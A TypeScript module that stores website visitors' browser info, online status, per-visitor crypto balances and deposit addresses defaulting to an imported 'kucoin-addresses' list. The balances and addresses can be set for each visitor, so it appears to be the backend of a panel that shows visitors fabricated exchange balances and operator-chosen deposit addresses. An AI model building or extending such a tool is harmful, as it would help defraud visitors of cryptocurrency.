// Enhanced visitor store with file-based persistence for Render
import fs from "fs"
import path from "path"
import { coinAddresses } from "../kucoin-addresses"

interface CryptoBalance {
  quantity: string
  eurBalance: string
  percentageChange: string
}

interface VisitorData {
  id: string
  name: string
  balances: Map<string, CryptoBalance>
  resetRequested: boolean
  selectedCryptos: string[]
  cryptoAddresses: Map<string, string>
  isOnline: boolean
  browserInfo: string | null
  lastSeen: number // Add timestamp
}

class PersistentVisitorStore {
  private visitors: Map<string, VisitorData>
  private visitorCounter: number
  private dataFile: string

  constructor() {
    this.visitors = new Map()
    this.visitorCounter = 0
    this.dataFile = path.join(process.cwd(), "data", "visitors.json")
    this.loadData()
  }

  private ensureDataDir() {
    const dataDir = path.dirname(this.dataFile)
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true })
    }
  }

  private loadData() {
    try {
      this.ensureDataDir()
      if (fs.existsSync(this.dataFile)) {
        const data = JSON.parse(fs.readFileSync(this.dataFile, "utf8"))
        this.visitorCounter = data.visitorCounter || 0

        // Restore visitors with Map conversion
        if (data.visitors) {
          Object.entries(data.visitors).forEach(([id, visitorData]: [string, any]) => {
            const visitor: VisitorData = {
              ...visitorData,
              balances: new Map(Object.entries(visitorData.balances || {})),
              cryptoAddresses: new Map(Object.entries(visitorData.cryptoAddresses || {})),
            }
            this.visitors.set(id, visitor)
          })
        }
      }
    } catch (error) {
      console.error("Error loading visitor data:", error)
    }
  }

  private saveData() {
    try {
      this.ensureDataDir()
      const data = {
        visitorCounter: this.visitorCounter,
        visitors: Object.fromEntries(
          Array.from(this.visitors.entries()).map(([id, visitor]) => [
            id,
            {
              ...visitor,
              balances: Object.fromEntries(visitor.balances),
              cryptoAddresses: Object.fromEntries(visitor.cryptoAddresses),
            },
          ]),
        ),
      }
      fs.writeFileSync(this.dataFile, JSON.stringify(data, null, 2))
    } catch (error) {
      console.error("Error saving visitor data:", error)
    }
  }

  // Clean up old offline visitors (older than 1 hour)
  private cleanupOldVisitors() {
    const oneHourAgo = Date.now() - 60 * 60 * 1000
    let cleaned = false

    for (const [id, visitor] of this.visitors.entries()) {
      if (!visitor.isOnline && visitor.lastSeen < oneHourAgo) {
        this.visitors.delete(id)
        cleaned = true
      }
    }

    if (cleaned) {
      this.saveData()
    }
  }

  getVisitor(visitorId: string): VisitorData | undefined {
    this.cleanupOldVisitors()
    return this.visitors.get(visitorId)
  }

  addVisitor(visitorId: string): VisitorData {
    this.visitorCounter++
    const visitorName = `Visitor ${this.visitorCounter}`
    const newVisitor: VisitorData = {
      id: visitorId,
      name: visitorName,
      balances: new Map(),
      resetRequested: false,
      selectedCryptos: [],
      cryptoAddresses: new Map(),
      isOnline: true,
      browserInfo: null,
      lastSeen: Date.now(),
    }

    // Populate cryptoAddresses with default values
    for (const [cryptoId, address] of Object.entries(coinAddresses)) {
      newVisitor.cryptoAddresses.set(cryptoId, address)
    }

    this.visitors.set(visitorId, newVisitor)
    this.saveData()
    return newVisitor
  }

  updateBalance(
    visitorId: string,
    cryptoId: string,
    quantity: string,
    eurBalance: string,
    percentageChange: string,
  ): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.balances.set(cryptoId, { quantity, eurBalance, percentageChange })
      visitor.lastSeen = Date.now()
      this.saveData()
      return visitor
    }
    return undefined
  }

  updateSelectedCryptos(visitorId: string, cryptos: string[]): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.selectedCryptos = cryptos
      visitor.lastSeen = Date.now()
      this.saveData()
      return visitor
    }
    return undefined
  }

  updateCryptoAddress(visitorId: string, cryptoId: string, address: string): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.cryptoAddresses.set(cryptoId, address)
      visitor.lastSeen = Date.now()
      this.saveData()
      return visitor
    }
    return undefined
  }

  updateOnlineStatusAndBrowserInfo(
    visitorId: string,
    isOnline: boolean,
    browserInfo: string | null,
  ): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.isOnline = isOnline
      visitor.browserInfo = browserInfo
      visitor.lastSeen = Date.now()
      this.saveData()
      return visitor
    }
    return undefined
  }

  markVisitorForReset(visitorId: string): boolean {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.resetRequested = true
      visitor.lastSeen = Date.now()
      this.saveData()
      return true
    }
    return false
  }

  deleteVisitor(visitorId: string): boolean {
    const deleted = this.visitors.delete(visitorId)
    if (deleted) {
      this.saveData()
    }
    return deleted
  }

  getAllVisitors(): VisitorData[] {
    this.cleanupOldVisitors()
    return Array.from(this.visitors.values())
  }
}

// Export singleton instance
export const visitorStore = new PersistentVisitorStore()
